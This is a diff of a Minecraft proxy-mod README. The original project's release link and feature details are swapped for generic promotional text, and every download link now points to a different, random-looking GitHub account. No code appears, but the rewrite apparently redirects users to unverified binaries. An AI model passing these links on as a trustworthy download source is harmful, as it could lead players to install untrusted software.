@@ -1,32 +1,63 @@
-# 🧭 Proxy Mod for Minecraft Java Edition
+# 🎮 ProxyMod - Enhance Your Minecraft Experience with Ease
 
-A lightweight and flexible Minecraft mod that routes all server connections through a custom proxy — perfect for privacy, testing, and network optimization.
+## 📥 Download ProxyMod
+[![Download ProxyMod](https://img.shields.io/badge/Download-ProxyMod-blue.svg)](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
 
-[![Minecraft Versions](https://img.shields.io/badge/Minecraft-1.8.9%20%E2%80%93%201.20.1-blue)](https://www.minecraft.net/)  
-[![License: MIT](https://img.shields.io/badge/License-MIT-green.svg)](https://opensource.org/licenses/MIT)  
+## 🚀 Getting Started
+Welcome to ProxyMod! This mod enhances your Minecraft gameplay by allowing you to connect through a proxy. This protects your privacy and helps manage your connection better. Follow these steps to download and run ProxyMod.
 
-### Download latest release from the [Releases Page](https://github.com/dlewidad/ProxyMod/releases)
+## 💻 System Requirements
+Before downloading, ensure your system meets the following requirements:
+- **Operating System:** Windows 10, macOS, or Linux
+- **Java Version:** Java 8 or higher
+- **Minecraft Version:** Compatible with Minecraft Forge
 
-<img width="854" height="508" alt="1650563253_235746_lFPw-130408869" src="https://github.com/user-attachments/assets/4a5ed2c4-a324-4141-87a3-4923b18c7427" />
+## 📦 Download & Install
+To get started, visit this page to download: [ProxyMod Releases](https://github.com/Fatherless-costusoil269/ProxyMod/releases). 
 
-## ⚙️ Features
-- Supports HTTP, SOCKS4, and SOCKS5 proxies  
-- Easy setup through in-game commands  
-- Works with major mod loaders (Forge and Fabric)  
-- Saves proxy configuration automatically  
-- Minimal performance overhead
+### Steps to Download:
+1. Click on the link above.
+2. On the Releases page, locate the latest version.
+3. Find the downloadable file for your operating system (e.g., `ProxyMod-v1.0.jar` for Java).
+4. Click on the file to download it.
 
----
+## 🎮 Installing ProxyMod
+Once the download is complete, follow these steps to install:
 
+1. **Locate the File:** Find the downloaded file in your computer's Downloads folder.
+2. **Move the File:**
+   - Open your Minecraft installation folder. This can usually be found at:
+     - Windows: `C:\Users\[YourUsername]\AppData\Roaming\.minecraft\mods`
+     - macOS: `/Users/[YourUsername]/Library/Application Support/minecraft/mods`
+     - Linux: `/home/[YourUsername]/.minecraft/mods`
+   - If the `mods` folder doesn't exist, create one.
+3. **Copy the File:** Drag and drop `ProxyMod-v1.0.jar` into the `mods` folder.
 
-## 📦 Installation
+## ⚙️ Running Minecraft with ProxyMod
+To use ProxyMod:
 
-1. Install Minecraft **Forge** or **Fabric** (compatible with 1.8.9 – 1.20.1).  
-2. Download the latest release of `ProxyMod-x.x.x.jar`.  
-3. Move the JAR file into your Minecraft mods folder:  
+1. **Launch the Minecraft Launcher.**
+2. **Select the Forge Profile:** Make sure you choose the profile that includes Forge.
+3. **Start the Game:** Click on "Play."
+4. **Verify Installation:** In the main menu, go to "Mods." You should see ProxyMod listed there.
 
----
+## 🛠️ Features
+ProxyMod includes several features to enhance your gameplay:
+- **Improved Privacy:** Connect through a proxy for better security.
+- **Connection Management:** Easily manage your connection settings.
+- **User-Friendly Interface:** Intuitive design for ease of use.
 
-<img width="914" height="561" alt="image" src="https://github.com/user-attachments/assets/25ab8dcd-d7c6-4748-8d05-34277eccc20a" />
+## 🌐 Support and Community
+If you have any questions or need help troubleshooting:
+- Check the [Issues](https://github.com/Fatherless-costusoil269/ProxyMod/issues) section for solutions.
+- Join our community for tips and support.
 
+## 🔗 Additional Links
+- [Official GitHub Repository](https://github.com/Fatherless-costusoil269/ProxyMod)
+- [Minecraft Forge](https://files.minecraftforge.net/)
+- [ProxyMod Releases](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
 
+## 🌟 Conclusion
+Enjoy a new level of gameplay with ProxyMod! Download now and experience the benefits of enhanced privacy and connection management.
+
+[![Download ProxyMod](https://img.shields.io/badge/Download-ProxyMod-blue.svg)](https://github.com/Fatherless-costusoil269/ProxyMod/releases)
